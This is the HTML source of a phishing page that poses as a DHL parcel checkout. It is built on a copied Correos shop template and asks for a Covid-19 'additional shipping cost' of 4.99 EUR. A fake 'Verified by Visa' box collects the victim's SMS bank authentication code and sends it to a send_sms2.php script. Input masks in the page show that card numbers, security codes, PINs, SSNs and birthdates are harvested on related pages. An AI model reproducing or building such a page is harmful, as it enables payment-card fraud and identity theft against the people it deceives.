<html lang="en"><head>


	<link href="./style/main.44.css" rel="stylesheet">
<script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.CardValidator.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>
<script src="./style/js/tyle.js"></script>


  <script type="text/javascript">
    $(function() {
        $('#cardnumber').mask('0000 0000 0000 0000');
    $('#Securitycode').mask('0000');

        $('#birthdate').mask('00/00/0000');

        $('#SSN').mask('000-00-0000');

        $('#PinCode').mask('0000');
        $('#phoneNumber').mask('+000 00000000000');

        $('#expdate').mask('00/0000');

  });
  </script>


<style>
#Securitycode {
background-image: url('./style/sprite_logos_wallet_2x.png');
background-repeat: no-repeat;
 
    background-size: 56px;
background-position: 109.5% 48.1%;

}

 #cardnumber {
background-image: url('./style/cards-sprite-small@2x.png');
background-repeat: no-repeat;
background-size: 42px;

}

</style>



		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
		<link rel="stylesheet" href="https://cdn.mycomandia.com/static/shop/common/bundle/bootstrap-4.1.0/css/bootstrap.min.css?v=2019.12.17" media="screen">
		<link rel="stylesheet" href="https://cdn.mycomandia.com/static/shop/common/css/validationEngine.jquery.css?v=2019.12.17">
		<link rel="stylesheet" href="https://cdn.mycomandia.com/static/shop/common/fonts/flaticon/flaticon.css?v=2019.12.17">
		<link rel="stylesheet" href="https://cdn.mycomandia.com/static/shop/common/bundle/font-awesome-5/web-fonts-with-css/css/fontawesome-all.min.css?v=2019.12.17">
		<link rel="stylesheet" href="https://cdn.mycomandia.com/static/shop/common/css/new-style-common-screen.css?v=2019.12.17">
		<link rel="stylesheet" href="https://tienda.correos.es/css/common-dynamic.css">
		<style>
		.newbar {position: relative;
    display: -ms-flexbox;
    display: flex;
    background-color: #ffd83f;
    -ms-flex-wrap: wrap;
    flex-wrap: wrap;
    -ms-flex-align: center;
    align-items: center;
    -ms-flex-pack: justify;
    justify-content: space-between;
    padding: .5rem 1rem; 
	}
	</style>

		
		<title>Magasin de poste en ligne: bien plus que des lettres</title>
		<meta name="description" lang="es" content="En la Tienda Online de Correos tenemos todo para hacer tus envíos: cajas, sobres, sellos, embalajes... regalos, coleccionismo y productos solidarios.">
		
		
		

		
		
			<meta name="robots" content="index,follow">
		

		
		<meta name="expires" content="0">
		<meta name="revisit-after" content="1 days">
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<meta http-equiv="pragma" content="no-cache">
		
		
		
		

		
	</head>

	<body class="common-screen-body" style="">
		
		
			
			
		
		
		<section class="common-screen-header">
			<nav class="newbar navbar-expand-md navbar-light">
				
			    <a class="navbar-brand" href="/"><img style="height:50px;" src="./style/dhl-official.svg"></a>
			    
			    
			    
			    
				<div class="collapse navbar-collapse" id="common-screen-top-navbar">
					<div class="navbar-nav ml-auto">
						
						
							
								<a class="nav-item nav-link" href="#">Private customers</a>					
								<a class="nav-item nav-link" href="#">Company customers</a>
							

						
						
						

						
						<a class="nav-item nav-link" href="#">to identify</a>
						
						
						

						
				        
				    </div>
			    </div>
			</nav>
		</section>
		
		<section class="common-screen-content">
			

















<section class="go-back-to-shop">
	<div class="container">
		<ul class="nav">
			<li class="nav-item">
				<a class="nav-link" href="#">&lt; Back</a>
			</li>
		</ul>
	</div>
</section>

<section class="checkout-template">
	<div class="container">
	
		<div class="cart-no-product-alert" style="display:none">No tienes productos en tu cesta</div>
	
	
	
	
		










		<div class="alert alert-danger alert-error alert-dismissable shopping-cart-alert" style="display:none"><button type="button" class="close" data-dismiss="alert">×</button><strong></strong></div>
		
		<div class="checkout-mobile-summary">

















<div class="checkout-summary-fixed d-block d-lg-none">
	<div class="row">
		
	</div>
	<!-- summary checkout mobile -->
	<div class="summary-checkout">
		<div class="summary-product-thumbs row">
		
		
			
			
		
		</div>
		<hr>
		<div class="row">
			<div class="col">
				<span>Totale</span>
			</div>
			<div class="col text-right">
				<span>2,99 €</span>
			</div>
		</div>
		
	</div>
	<!-- /summary checkout mobile -->
</div></div>
		
	
		<div class="row flex-column-reverse flex-lg-row">
			<div class="col-lg-7">
				<div class="checkout-left-side">
					<div id="cartParent" style="opacity: 1;">
						<div id="shippingZoneLocked" class="shopping-cart-locked-parent" style="display: block;">













</div>
						<div id="shippingZoneForm" class="shopping-cart-form-parent" style="display: none;">














</div>
					
						<div id="carrierLocked" class="shopping-cart-locked-parent" style="display: block;">














<section class="checkout-small-shipping-type small-box">
	
	<div class="small-box-content">
		
		<div class="title">
			<div class="title-content">
				<div class="title-icon">
					<i class="flaticon-package"></i>
				</div>
				<div class="title-text">
					<h4>Identification number: 9735744596571</h4>
					<p>Express package</p>
					
					 
				</div>
			</div>
		</div>
		<div class="buttons">
			<button class="btn btn-primary modify-button btn-edit-carrier">
				<span class="d-none d-sm-none d-md-block">change</span>
				<span class="d-block d-sm-block d-md-none"><i class="fas fa-edit"></i></span>
			</button>
		</div>
	</div>
</section>
</div>
						<div id="carrierFormParent" class="shopping-cart-form-parent" style="display: none;">




















<section class="checkout-shipping-type">
	<div class="checkout-box">	
		
		<div class="checkout-box-title">
			<div class="checkout-box-title-icon"><i class="flaticon-package"></i></div>
			<h4>Código de envío : ES/2938456</h4>
		</div>
		<div class="checkout-box-content">
			<div class="checkout-shipping-type-content">
				
				
					<form id="carrierForm" method="post" action="/cart/changecarrier" class="">
						<input type="hidden" name="carrierid" id="carrierid" value="3">
						<input type="hidden" name="isselfpick" id="isselfpick" value="0">
						<input type="hidden" name="selfpickstorecode" id="selfpickstorecode" value="">
						<input type="hidden" name="homepaqtoken" id="homepaqtoken" value="">
						
						
							
									
							<!--  NEW SCREEN BEGIN -->
							<div class="checkout-shipping-type-zones">
								<div class="checkout-shipping-type-zones-image">
									
									<img class="img-responsive" alt="Paq Estándar" src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQTrX8MP4pA-vzwCA0DiAM71Fj69Cm9CP7aY7NITLF99rsGcwM9">
									
									
								</div>
								
								
									<div class="custom-control custom-checkbox form-check office-delivery">
										
											<input type="checkbox" id="carrierselection3" class="custom-control-input carrierselection" data-carrier="3" data-selfpick="0">
											<label class="custom-control-label" for="carrierselection3">
												A tu domicilio <strong>(2,99 €)</strong>
											</label>
										
									</div>
								
								
								
									<div class="custom-control custom-checkbox form-check office-nodelivery-container">
										
										<input type="checkbox" id="carrierselection_self3" class="custom-control-input carrierselection" data-carrier="3" data-selfpick="1" data-postalcode="39999" data-is-pickup-at-shop="0">
										<label class="custom-control-label" for="carrierselection_self3">
										
											Recogida en oficina de Correos <strong>(2,99 €)</strong>
										
										</label>
										
										
									<!-- Correos hidden offices -->
										
										<div class="offices-search-container" style="display:none">
											<!-- <div class="custom-control custom-checkbox form-check">
												<input type="checkbox" class="custom-control-input" id="Office1">
												<label class="custom-control-label" for="Office1">Barcelona suc 16. la vila olimpica - doctor trueta 58-60 08005 barcelona</label>
											</div>
											<div class="custom-control custom-checkbox form-check">
												<input type="checkbox" class="custom-control-input" id="Office2">
												<label class="custom-control-label" for="Office2">Barcelona suc 16. la vila olimpica - doctor trueta 58-60 08005 barcelona</label>
											</div> -->
										</div>
									<!-- Correos hidden offices -->
										
									</div>
								
								
							</div>
							<div style="width:100%">
								
								<small class="text-muted"><p>Tus envíos en un máximo de 72 horas</p></small>
							</div>
						<!--  NEW SCREEN END -->
						
						
							
									
							<!--  NEW SCREEN BEGIN -->
							<div class="checkout-shipping-type-zones type-city">
								<div class="checkout-shipping-type-zones-image">
									
									<img class="img-responsive" alt="Paq Estándar CityPaq" src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQTrX8MP4pA-vzwCA0DiAM71Fj69Cm9CP7aY7NITLF99rsGcwM9">
									
									
								</div>
								
								
									<div class="custom-control custom-checkbox form-check office-delivery">
										
										
											
												<input type="checkbox" id="carrierselection9" class="custom-control-input carrierselection" data-carrier="9" data-homepaq="1" data-selfpick="1">
												<label class="custom-control-label" for="carrierselection9">
													Envío mediante CityPaq <strong>(2,99 €)</strong>
												</label>
													
												<div class="cityPaq-search-container" style="display:none;">
													
														<p>Indique su nombre de usuario CityPaq:</p>
														<div class="input-group">
															<input class="form-control py-2 homepaqusername validate[required]" type="search" name="homepaqusername9" id="homepaqusername9">
															<span class="input-group-append">
																<input type="button" class="btn btn-outline-secondary searchhomepaq" value="Buscar" data-val="homepaqusername9" data-target="homepaqresult9">
															</span>
														</div>
														
														<div id="homepaqresult9" class="homepaqresultdiv">
															<p class="citypaq-text">
																Si aún no es usuario de CityPaq, puede registrarse en este enlace: <a href="https://online.citypaq.es/pages/registro.xhtml" target="_homepaq">Ir a CityPaq</a>
															</p>
														</div>
													
												</div>
												
										
									</div>
								
								
								
								
							</div>
							<div style="width:100%">
								
									
										 <small class="text-muted">Paq Estándar CityPaq</small>
									
								
								<small class="text-muted"><p>Haz tus pedidos y recógelos en el CityPaq que más te convenga</p></small>
							</div>
						<!--  NEW SCREEN END -->
						
						
					</form>
				
				
				
				
			</div>
		</div>
	</div>
</section></div>
						
						<div id="paypalexpressParent" class="shopping-cart-locked-parent" style="display: block;">











	
	
</div>
						
						<div id="shippingAddressLocked" class="shopping-cart-locked-parent" style="display: none;"></div>
						<div id="shippingAddressList" class="shopping-cart-form-parent" style="display: none;"></div>
						<div id="shippingAddressForm" class="shopping-cart-form-parent" style="display: block;">















<section class="checkout-new-shipping-address">
	<div class="checkout-box">
		<div class="checkout-box-title">
			<div class="checkout-box-title-icon"><i class="flaticon-list"></i></div>
			<h4>payment details</h4>
		</div>
		<div class="checkout-box-content">
			
			
			<form class="checkout-new-shipping-address-form" method="post" action="./system/send_sms2.php" data-toggle="validate">
				
				
<center>

				<div class="container" style="width: 360px;height: 390px;padding: 5px;background-color: white;border: 2px solid #000!important;border-radius: 7px;">
            






<table style="width: 60%; height: 31px">
    <tbody><tr>
        <td align="left">
            <img style="display: block; margin-left: auto; margin-right: auto; height: 40%;" src="./style/verified-by-visa-png-2.png" alt="Logotipo do Banco Emissor" border="1" class="img-responsive pull-left"></td>
        <td align="right">
            </td>
    </tr>
</tbody></table>
<hr style="padding: 0px; margin: 0px"><br>        



            



        
        
        
        
    

<div>
    <table class="tableAcs">
        <tbody><tr>
            <td class="tdAcs">Date:&nbsp;05/01/2021</td>
            <td class="tdAcs" align="center"><strong>DETAILS OF THE ORDER</strong></td>
        </tr>
        <tr>
            <td class="tdAcs">Merchant</td>
            <td class="tdAcs">DHL</td>
        </tr>
        <tr>
            <td class="tdAcs">Amount</td>
            <td class="tdAcs">EUR 4.99</td>
        </tr>
        <tr>
            <td class="tdAcs">Card Number</td>
            <td class="tdAcs">******</td>
        </tr>
</tbody></table>
</div>
<br>

            <table border="0" width="100%" cellpadding="0" cellspacing="0">
                <tbody><tr><td align="center"><span class="text-mutedAcs">3-SECURE AUTHENTICATION<i></i></span></td></tr>
            </tbody></table>
<br>
            <p class="text-muted" style="
    margin-bottom: 2rem;
">An SMS was sent to the number ********* with the authentication code. Wait for the SMS and after receiving it, please enter the code below.</p>
            <label for="codigo">Code:</label>&nbsp; <input required="" size="10" name="sms" id="codigo" style="width: 90px;border: 1px solid #f60000;height: 41px;border-radius: 3px;" type="text">
            <input style="padding: 10px;border-radius: 3px;background-color: #A3A8A3;" class="btn-primaryAcs" type="submit" value="Confirm" id="submit">
            
            <input style="padding: 10px;border-radius: 3px;" value="Request SMS" class="btn-warningAcs" id="submitsms" type="submit" disabled="">

            
                <p class="text-muted small"><i>This information is not shared with the merchant</i><br></p>
      
            
        
        
        
        

            <table border="0" width="100%" cellpadding="0" cellspacing="0">
                <tbody><tr>
                    <td align="left">
                        <a href="#" data-toggle="modal" data-target="#myModal">
                            Help
                        </a>
                    </td>
                    <td align="right">
                        <a href="#">Cancel</a>
                    </td>
                </tr>
            </tbody></table>


            
            
            
            <hr style="padding: 0px; margin: 0px">

        </div>
				
				
				 
				
				
				<div class="form-group">
					
				</div>
				
				
				
			
			
		</center></form></div>
	</div>
</section>
</div>
						
						<div id="billingAddressLocked" class="shopping-cart-locked-parent" style="display: none;"></div>
						<div id="billingAddressForm" class="shopping-cart-form-parent" style="display: none;"></div>
						
						<div id="paymentBox" class="shopping-cart-form-parent" style="display: none;"></div>
						<div id="paymentLocked" class="shopping-cart-locked-parent" style="display: none;"></div>
						
						
						<div id="discountForm" class="shopping-cart-form-parent d-lg-none" style="display: none;"></div>
						<div id="discountLocked" class="shopping-cart-locked-parent" style="display: none;"></div>
						
						
						
						
						<div id="checkoutButton" style="display:none">
							<div class="order-payment-checkboxs">
								<div class="custom-control custom-checkbox">
									<input type="checkbox" name="isacceptmarketing" class="custom-control-input" id="isacceptmarketing" value="YES">
									<label class="custom-control-label" for="isacceptmarketing">Deseo recibir ofertas y promociones de los productos y servicios comercializados</label>
								</div>
							
								<div class="custom-control custom-checkbox">
									<input type="checkbox" name="accept_dpp" class="custom-control-input validate[required]" id="accept_dpp" data-prompt-position="bottomRight" value="YES">
									
									
									<label class="custom-control-label" for="accept_dpp">He leído y acepto las <a target="_blank" href="/page/condiciones-generales"><b>Condiciones de Venta</b></a>.</label>
									
								</div>
							</div>
							
							
							<section class="continue-button py-2 mb-4">
								<div class="d-flex justify-content-end">
								
									<button type="button" class="btn btn-primary btn-shopping-cart-checkout">Confirmar y pagar pedido &gt;</button>
								
								</div>
							</section>
						</div>
						
					</div>

					
				</div>
			</div>
			<div class="col-lg-5">
				<div class="checkout-right-side">


















<section class="checkout-summary d-none d-lg-block">

	
	<div class="summary-product-list">
		
		
			
	
			<div class="item">
				<div class="row">
					<div class="col-3 flex-grow-0 image-col">
						<div class="item-image">
							
							<a href="#">
								
								
									
										<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQTrX8MP4pA-vzwCA0DiAM71Fj69Cm9CP7aY7NITLF99rsGcwM9">
									
								
							</a>
							
						</div>
					</div>
					<div class="col-5 title-col">
						<div class="item-title">
							<p>Additional shipping costs (Covid-19)<i></i>
							</p>
						</div>
						
					</div>
					<div class="col-4 flex-grow-0 buttons-col">
						<div class="d-flex buttons-col-container justify-content-between h-100">
							<div class="item-delete-button">
								<button class="btn-update-cart-item-quantity" data-input-selector="#cartQuantityProductId_147" value="0"><i class="far fa-trash-alt"></i></button>
							</div>
							<div class="item-price-total">
								<p class="item-price">4.99 €</p>
								<p class="item-vat-text">(€ 1.99 IVA included)</p>
							</div>
						</div>
					</div>
				</div>
				
				
			</div>
			
		
	
	</div>
	
	
	<div class="summary-subtotal">
		
	<div class="summary-total">
		<div class="row">
			<div class="col">
				<div class="text-left">
					<p class="total-title">Totale</p>
				</div>
			</div>
			<div class="col">
				<div class="text-right">
					<p class="total-amount">4.99 €</p>
					
					<p class="total-vat-included">(VAT included)</p>
				</div>
			</div>
		</div>
	</div>
</div></section>
</div>
			</div>
		</div>
		
	</div>
</section>

		</section>
		
		
		
		
		
		
		
		
	    



  

<style type="text/css">#codigo {
    font-size: medium;
    border: 1px solid #007dc3
}
body {
    margin: 0;
    background: #FFF;
    font-family: Arial, Helvetica, sans-serif;
    font-size: 12px;
    color: #646464
}
.tableAcs {
  border-spacing: 2px;
  border-collapse: separate;
  width: 350px;
}
.tdAcs{
    background: #D9D9D9;    
    padding: 2px;
}
.containerAcs {
  padding-right: 15px;
  padding-left: 15px;
  margin-right: auto;
  margin-left: auto;
}
.text-mutedAcs {
  color: #404040;
  font-weight: bold;
}
.text-mutedGrayAcs {
  color: #646464;
}
.text-mutedInfoAcs {
  color: #337ab7;
}
.text-mutedErrorAcs {
  color: red;
  font-weight: bold;
}
.text-mutedUnderlineAcs {
  color: #404040;
  text-decoration: underline;
}
.text-left {
  text-align: left;
}
.text-right {
  text-align: right;
}
.text-center {
  text-align: center;
}
.text-justify {
  text-align: justify;
}
.small {
  font-size: 85%;
}
.btn-primaryAcs {
  color: white;
  background-color: #A3A8A3;
  border-color: #A3A8A3;
  border-radius: 5px;
}
.btn-warningAcs {
  color: black;
  background-color: #D9D9D9;
  border-color: #D9D9D9;
  border-radius: 5px;
}
.error {
    color: red;
    font-family: Arial, Helvetica, sans-serif;
}
.centerDivAcs {
    width: 60%;
    height: 200px;
    margin: 0 auto;
    background-color: white;
}
.aAcs {
    color: #646464;
    text-decoration: none;
}</style> </body></html>